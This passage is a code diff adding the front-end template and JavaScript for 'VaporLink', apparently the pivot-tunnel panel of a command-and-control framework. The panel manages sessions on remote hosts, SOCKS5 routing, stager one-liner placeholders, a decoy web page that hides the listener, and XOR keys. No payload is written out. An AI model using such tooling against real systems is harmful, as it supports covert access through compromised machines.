+            </div>
+
+            <!-- Real-Time Event Log (7 cols) -->
+            <div class="xl:col-span-7 tactical-card p-5 space-y-3">
+                <div class="flex items-center justify-between border-b border-slate-800/80 pb-3">
+                    <h2 class="text-sm font-semibold text-slate-100">VaporLink Event Log</h2>
+                    <button type="button" onclick="clearVaporLogs()" class="tactical-btn-ghost text-xs py-1 px-2.5">
+                        {{ icon('trash', 'w-3.5 h-3.5') }}
+                        <span>Clear</span>
+                    </button>
+                </div>
+                <div id="vl-log-console" class="bg-slate-950 border border-slate-800/90 rounded-xl p-4 h-72 overflow-y-auto font-mono text-xs space-y-1.5">
+                    {% for entry in vl_status.logs %}
+                    <div>
+                        <span class="text-slate-500">[{{ entry.timestamp }}]</span>
+                        <span class="font-semibold {% if entry.level == 'SECURITY' %}text-rose-400{% elif entry.level == 'AUTH' %}text-emerald-400{% elif entry.level == 'STAGER' %}text-cyan-400{% elif entry.level == 'SESSION' %}text-amber-400{% else %}text-slate-300{% endif %}">[{{ entry.level }}]</span>
+                        <span class="text-slate-200">{{ entry.message }}</span>
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Reverse Proxy Config Modal -->
+<div id="proxyConfigModal" class="fixed inset-0 z-50 hidden items-center justify-center bg-slate-950/80 backdrop-blur-sm p-4">
+    <div class="tactical-card max-w-2xl w-full p-6 space-y-4 border-slate-700">
+        <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+            <h3 class="text-base font-bold text-slate-100">Nginx &amp; Apache Reverse Proxy Configuration</h3>
+            <button type="button" onclick="GlyconUI.closeModal('proxyConfigModal')" class="text-slate-400 hover:text-slate-100">
+                {{ icon('close', 'w-5 h-5') }}
+            </button>
+        </div>
+        <div class="space-y-3">
+            <div>
+                <div class="flex items-center justify-between mb-1">
+                    <span class="text-xs font-semibold text-emerald-400">Nginx Location Block</span>
+                    <button type="button" onclick="copyText(document.getElementById('modal-nginx-cfg').value, 'Nginx config copied')" class="tactical-btn-ghost text-xs py-1 px-2">Copy</button>
+                </div>
+                <textarea id="modal-nginx-cfg" readonly rows="8" class="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs font-mono text-slate-200">{{ vl_status.oneliners.nginx_config }}</textarea>
+            </div>
+            <div>
+                <div class="flex items-center justify-between mb-1">
+                    <span class="text-xs font-semibold text-cyan-400">Apache VirtualHost Block</span>
+                    <button type="button" onclick="copyText(document.getElementById('modal-apache-cfg').value, 'Apache config copied')" class="tactical-btn-ghost text-xs py-1 px-2">Copy</button>
+                </div>
+                <textarea id="modal-apache-cfg" readonly rows="6" class="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs font-mono text-slate-200">{{ vl_status.oneliners.apache_config }}</textarea>
+            </div>
+        </div>
+        <div class="flex justify-end pt-2">
+            <button type="button" onclick="GlyconUI.closeModal('proxyConfigModal')" class="tactical-btn-secondary text-xs">Close</button>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+function switchVaporTab(tabName) {
+    document.querySelectorAll('.vtab-panel').forEach(p => p.classList.add('hidden'));
+    const targetPanel = document.getElementById(`vtab-panel-${tabName}`);
+    if (targetPanel) targetPanel.classList.remove('hidden');
+
+    document.querySelectorAll('.vtab-btn').forEach(btn => {
+        btn.className = 'vtab-btn px-4 py-2 rounded-xl text-xs font-semibold transition-all text-slate-400 hover:text-slate-100 bg-slate-900/60 border border-slate-800 flex items-center gap-2';
+    });
+    const activeBtn = document.getElementById(`vtab-btn-${tabName}`);
+    if (activeBtn) {
+        activeBtn.className = 'vtab-btn px-4 py-2 rounded-xl text-xs font-semibold transition-all bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 flex items-center gap-2';
+    }
+}
+
+function selectOneLinerCard(cardId) {
+    document.querySelectorAll('.ol-card').forEach(c => c.classList.add('hidden'));
+    const card = document.getElementById(cardId);
+    if (card) card.classList.remove('hidden');
+
+    const idx = cardId.replace('ol-card-', '');
+    document.querySelectorAll('.ol-pill').forEach(p => {
+        p.className = 'ol-pill px-3 py-1.5 rounded-lg text-xs font-semibold text-slate-400 bg-slate-950/70 border border-slate-800';
+    });
+    const pill = document.getElementById(`ol-pill-${idx}`);
+    if (pill) {
+        pill.className = 'ol-pill px-3 py-1.5 rounded-lg text-xs font-semibold bg-emerald-500/15 text-emerald-400 border border-emerald-500/30';
+    }
+}
+
+async function toggleDecoyEditor() {
+    const editor = document.getElementById('decoy-editor-container');
+    const preview = document.getElementById('decoy-preview-container');
+    const btnText = document.getElementById('decoy-edit-btn-text');
+    const isHidden = editor.classList.contains('hidden');
+    if (isHidden) {
+        const res = await fetch('/api/vaporlink/decoy');
+        const json = await res.json();
+        if (json.status === 'success') {
+            document.getElementById('decoy-html-textarea').value = json.html;
+        }
+        editor.classList.remove('hidden');
+        preview.classList.add('hidden');
+        btnText.textContent = 'Show Preview';
+    } else {
+        editor.classList.add('hidden');
+        preview.classList.remove('hidden');
+        document.getElementById('decoy-preview-iframe').src = '/vaporlink/decoy?t=' + Date.now();
+        btnText.textContent = 'Edit HTML';
+    }
+}
+
+async function saveDecoyHtml(resetDefault = false) {
+    const html = document.getElementById('decoy-html-textarea').value;
+    const res = await fetch('/api/vaporlink/decoy', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({html, reset: resetDefault})
+    });
+    const json = await res.json();
+    if (json.status === 'success') {
+        document.getElementById('decoy-html-textarea').value = json.html;
+        document.getElementById('decoy-preview-iframe').src = '/vaporlink/decoy?t=' + Date.now();
+        GlyconUI.toast(json.message, 'success');
+    } else {
+        GlyconUI.toast('Failed to save decoy HTML', 'error');
+    }
+}
+
+function formatBytes(bytes) {
+    const b = Number(bytes) || 0;
+    if (b < 1024) return b + ' B';
+    if (b < 1024 * 1024) return (b / 1024).toFixed(1) + ' KB';
+    if (b < 1024 * 1024 * 1024) return (b / (1024 * 1024)).toFixed(2) + ' MB';
+    return (b / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
+}
+
+function escapeHtml(str) {
+    const div = document.createElement('div');
+    div.textContent = str == null ? '' : String(str);
+    return div.innerHTML;
+}
+
+function copyText(text, msg) {
+    navigator.clipboard.writeText(text).then(() => {
+        GlyconUI.toast(msg || 'Copied to clipboard', 'success');
+    }).catch(() => {
+        GlyconUI.toast('Failed to copy to clipboard', 'error');
+    });
+}
+
+async function refreshVaporStatus(showFeedback = false) {
+    try {
+        const insecure = document.getElementById('oneliner-insecure-toggle').checked ? '1' : '0';
+        const res = await fetch(`/api/vaporlink/status?insecure=${insecure}`);
+        const json = await res.json();
+        if (json.status !== 'success') return;
+        renderVaporState(json.data);
+        if (showFeedback) GlyconUI.toast('VaporLink status updated', 'info');
+    } catch (e) {
+        console.error('VaporLink status poll error:', e);
+    }
+}
+
+function renderVaporState(st) {
+    const cfg = st.config;
+    const badge = document.getElementById('vl-running-badge');
+    const errBanner = document.getElementById('vl-error-banner');
+    if (st.running) {
+        badge.className = 'inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-medium bg-emerald-500/15 text-emerald-400 border border-emerald-500/30';
+        badge.innerHTML = '<span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span><span>Listener Online</span>';
+        errBanner.classList.add('hidden');
+    } else {
+        badge.className = 'inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-medium bg-rose-500/15 text-rose-400 border border-rose-500/30';
+        badge.innerHTML = '<span class="w-1.5 h-1.5 rounded-full bg-rose-400"></span><span>Listener Offline</span>';
+        if (st.listener_error) {
+            document.getElementById('vl-error-text').textContent = st.listener_error;
+            errBanner.classList.remove('hidden');
+        }
+    }
+
+    if (st.decoy_url) {
+        document.getElementById('header-decoy-link').href = st.decoy_url;
+        document.getElementById('decoy-url-inline').href = st.decoy_url;
+        document.getElementById('decoy-url-inline').textContent = st.decoy_url;
+        document.getElementById('decoy-open-btn').href = st.decoy_url;
+    }
+
+    document.getElementById('kpi-ws-bind').textContent = `${cfg.ws_ip}:${cfg.ws_port}`;
+    document.getElementById('kpi-ws-mode').textContent = `${cfg.tls_enabled ? 'HTTPS/WSS' : 'HTTP/WS'} • Decoy: ${cfg.web_server ? 'ON' : 'OFF'}`;
+    document.getElementById('kpi-socks-bind').textContent = `socks5://${cfg.socks_ip}:${cfg.socks_port}`;
+    document.getElementById('proxychains-hint').textContent = `socks5 ${cfg.socks_ip} ${cfg.socks_port}`;
+    document.getElementById('kpi-primary-target').textContent = st.primary_session
+        ? `Routed → ${st.primary_session.hostname}`
+        : 'Waiting for pivot...';
+    document.getElementById('kpi-session-count').textContent = st.session_count;
+    document.getElementById('tab-badge-sessions').textContent = st.session_count;
+    document.getElementById('tab-badge-bans').textContent = (st.banned_ips || []).length;
+    document.getElementById('kpi-stream-count').textContent = st.active_streams;
+    document.getElementById('kpi-tx').textContent = formatBytes(st.total_bytes_tx);
+    document.getElementById('kpi-rx').textContent = formatBytes(st.total_bytes_rx);
+
+    document.getElementById('cfg-xor-key').textContent = cfg.xor_key;
+    document.getElementById('cfg-conn-token').textContent = cfg.conn_token;
+
+    if (st.oneliners) {
+        document.getElementById('ol-staged-fg').value = st.oneliners.staged_fg;
+        document.getElementById('ol-staged-bg').value = st.oneliners.staged_bg;
+        document.getElementById('ol-standalone-fg').value = st.oneliners.standalone_fg;
+        document.getElementById('ol-windows-bg').value = st.oneliners.windows_cmd;
+        document.getElementById('modal-nginx-cfg').value = st.oneliners.nginx_config;
+        document.getElementById('modal-apache-cfg').value = st.oneliners.apache_config;
+    }
+
+    const tbody = document.getElementById('vl-sessions-tbody');
+    if (!st.sessions || st.sessions.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="9" class="text-center py-10 text-slate-500 text-sm">No active VaporLink pivot tunnels. Select an agent above or open the <strong>Client One-Liners</strong> tab to connect a target.</td></tr>`;
+    } else {
+        tbody.innerHTML = st.sessions.map(s => {
+            const srcBadge = s.source_type === 'glycon_agent'
+                ? `<span class="px-2 py-0.5 text-xs rounded-md bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 font-mono">Glycon (${escapeHtml((s.agent_id || '').slice(0, 8))})</span>`
+                : `<span class="px-2 py-0.5 text-xs rounded-md bg-cyan-500/15 text-cyan-300 border border-cyan-500/30 font-mono">One-Liner</span>`;
+            const dedSocks = s.dedicated_socks_bind
+                ? `<div class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-slate-950 border border-slate-800 font-mono text-xs text-cyan-300">
+                     <span>socks5://${escapeHtml(s.dedicated_socks_bind)}</span>
+                     <button type="button" onclick="copyText('socks5://${escapeHtml(s.dedicated_socks_bind)}', 'Dedicated SOCKS5 copied')" class="text-slate-400 hover:text-cyan-300">Copy</button>
+                   </div>`
+                : `<span class="text-xs text-slate-500">N/A</span>`;
+            const primCell = s.is_primary
+                ? `<span class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-semibold bg-emerald-500/15 text-emerald-400 border border-emerald-500/30"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>Active on :${cfg.socks_port}</span>`
+                : `<button type="button" onclick="setPrimarySession('${escapeHtml(s.session_id)}')" class="tactical-btn-ghost text-xs py-1 px-2.5">Route to :${cfg.socks_port}</button>`;
+
+            return `<tr>
+                <td class="font-mono text-xs text-cyan-400 font-semibold">${escapeHtml(s.session_id)}</td>
+                <td>
+                    <div class="font-semibold text-slate-100">${escapeHtml(s.hostname)}</div>
+                    <div class="text-xs font-mono text-slate-400">${escapeHtml(s.client_ip)} &bull; ${escapeHtml(s.os_info)}</div>
+                </td>
+                <td>${srcBadge}</td>
+                <td>${dedSocks}</td>
+                <td>${primCell}</td>
+                <td class="font-mono text-xs text-slate-200">${s.active_streams}</td>
+                <td class="font-mono text-xs">
+                    <span class="text-emerald-400">&uarr; ${formatBytes(s.bytes_tx)}</span> /
+                    <span class="text-cyan-400">&darr; ${formatBytes(s.bytes_rx)}</span>
+                </td>
+                <td class="font-mono text-xs text-slate-400">${escapeHtml(s.connected_since)}</td>
+                <td class="text-right space-x-1.5">
+                    <button type="button" onclick="kickSession('${escapeHtml(s.session_id)}')" class="tactical-btn-danger text-xs py-1 px-2.5">Disconnect</button>
+                    <button type="button" onclick="banIp('${escapeHtml(s.client_ip)}')" class="tactical-btn-ghost text-xs py-1 px-2 text-rose-400">Ban</button>
+                </td>
+            </tr>`;
+        }).join('');
+    }
+
+    const bansTbody = document.getElementById('vl-bans-tbody');
+    if (!st.banned_ips || st.banned_ips.length === 0) {
+        bansTbody.innerHTML = `<tr><td colspan="3" class="text-center py-6 text-xs text-slate-500">No banned IP addresses.</td></tr>`;
+    } else {
+        bansTbody.innerHTML = st.banned_ips.map(b => `<tr>
+            <td class="font-mono text-xs text-rose-400 font-semibold">${escapeHtml(b.ip)}</td>
+            <td class="text-xs text-slate-300">${escapeHtml(b.reason)}</td>
+            <td class="text-right">
+                <button type="button" onclick="unbanIp('${escapeHtml(b.ip)}')" class="tactical-btn-ghost text-xs py-1 px-2 text-emerald-400">Allow</button>
+            </td>
+        </tr>`).join('');
+    }
+
+    const logEl = document.getElementById('vl-log-console');
+    if (st.logs) {
+        logEl.innerHTML = st.logs.map(entry => {
+            let color = 'text-slate-300';
+            if (entry.level === 'SECURITY') color = 'text-rose-400';
+            else if (entry.level === 'AUTH') color = 'text-emerald-400';
+            else if (entry.level === 'STAGER') color = 'text-cyan-400';
+            else if (entry.level === 'SESSION') color = 'text-amber-400';
+            return `<div><span class="text-slate-500">[${escapeHtml(entry.timestamp)}]</span> <span class="font-semibold ${color}">[${escapeHtml(entry.level)}]</span> <span class="text-slate-200">${escapeHtml(entry.message)}</span></div>`;
+        }).join('');
+        logEl.scrollTop = logEl.scrollHeight;
+    }
+}
+
+function applyModePreset(mode) {
+    if (mode === 'standalone-https') {
+        document.getElementById('cfg-ws-ip').value = '0.0.0.0';
+        document.getElementById('cfg-ws-port').value = '9443';
+        document.getElementById('cfg-tls-enabled').checked = true;
+        document.getElementById('cfg-web-server').checked = true;
+        GlyconUI.toast('Preset loaded: Standalone HTTPS/WSS on 0.0.0.0:9443 (Click Save to apply)', 'info');
+    } else {
+        document.getElementById('cfg-ws-ip').value = '127.0.0.1';
+        document.getElementById('cfg-ws-port').value = '8000';
+        document.getElementById('cfg-tls-enabled').checked = false;
+        document.getElementById('cfg-web-server').checked = true;
+        GlyconUI.toast('Preset loaded: Reverse Proxy HTTP/WS on 127.0.0.1:8000 (Click Save to apply)', 'info');
+    }
+}
+
+async function saveVaporConfig(e) {
+    e.preventDefault();
+    const payload = {
+        ws_link: document.getElementById('cfg-ws-link').value.trim(),
+        ws_ip: document.getElementById('cfg-ws-ip').value.trim(),
+        ws_port: parseInt(document.getElementById('cfg-ws-port').value, 10),
+        socks_ip: document.getElementById('cfg-socks-ip').value.trim(),
+        socks_port: parseInt(document.getElementById('cfg-socks-port').value, 10),
+        tls_enabled: document.getElementById('cfg-tls-enabled').checked,
+        web_server: document.getElementById('cfg-web-server').checked
+    };
+    const res = await fetch('/api/vaporlink/config', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(payload)
+    });
+    const json = await res.json();
+    if (json.status === 'success') {
+        GlyconUI.toast(json.message, 'success');
+        renderVaporState(json.data);
+    } else {
+        GlyconUI.toast(json.message || 'Failed to update configuration', 'error');
+    }
+}
+
+async function rotateVaporKeys() {
+    const ok = await GlyconUI.confirm(
+        'Rotate XOR Key & Token?',
+        'Generates a new 16-byte XOR key and 32-byte X-Vapor-Token. Active sessions using old keys will be disconnected.'
+    );
+    if (!ok) return;
+    const res = await fetch('/api/vaporlink/genkey', {method: 'POST'});
+    const json = await res.json();
+    if (json.status === 'success') {
+        GlyconUI.toast(json.message, 'success');
+        renderVaporState(json.data);
+    } else {
+        GlyconUI.toast(json.message || 'Key rotation failed', 'error');
+    }
+}
+
+async function setPrimarySession(sessionId) {
+    const res = await fetch('/api/vaporlink/session/primary', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({session_id: sessionId})
+    });
+    const json = await res.json();
+    if (json.status === 'success') {
+        GlyconUI.toast(json.message, 'success');
+        renderVaporState(json.data);
+    } else {
+        GlyconUI.toast(json.message || 'Failed to switch primary session', 'error');
+    }
+}
+
+async function kickSession(sessionId) {
+    const res = await fetch('/api/vaporlink/session/kick', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({session_id: sessionId})
+    });
+    const json = await res.json();
+    if (json.status === 'success') {
+        GlyconUI.toast(json.message, 'warning');
+        renderVaporState(json.data);
+    }
+}
+
+async function controlAgentPivot(action) {
+    const agentId = document.getElementById('deploy-agent-select').value;
+    if (!agentId) {
+        GlyconUI.toast('Select a registered Glycon agent first', 'warning');
+        return;
+    }
+    const res = await fetch(`/api/vaporlink/agent/${encodeURIComponent(agentId)}/control`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({action})
+    });
+    const json = await res.json();
+    if (json.status === 'success') {
+        GlyconUI.toast(json.message, 'success');
+        setTimeout(() => refreshVaporStatus(false), 1500);
+    } else {
+        GlyconUI.toast(json.message || 'Failed to queue pivot task', 'error');
+    }
+}
+
+async function manualBanIp(e) {
+    e.preventDefault();
+    const ip = document.getElementById('ban-ip-input').value.trim();
+    if (!ip) return;
+    await banIp(ip);
+    document.getElementById('ban-ip-input').value = '';
+}
+
+async function banIp(ip) {
+    const res = await fetch('/api/vaporlink/ban', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ip, reason: 'Manual operator ban'})
+    });
+    const json = await res.json();
+    if (json.status === 'success') {
+        GlyconUI.toast(json.message, 'warning');
+        refreshVaporStatus(false);
+    } else {
+        GlyconUI.toast(json.message || 'Failed to ban IP', 'error');
+    }
+}
+
+async function unbanIp(ip) {
+    const res = await fetch(`/api/vaporlink/ban/${encodeURIComponent(ip)}`, {method: 'DELETE'});
+    const json = await res.json();
+    if (json.status === 'success') {
+        GlyconUI.toast(json.message, 'success');
+        refreshVaporStatus(false);
+    }
+}
+
+async function clearVaporLogs() {
+    await fetch('/api/vaporlink/logs/clear', {method: 'POST'});
+    refreshVaporStatus(false);
+}
+
+setInterval(() => refreshVaporStatus(false), 3000);
+</script>
+{% endblock %}
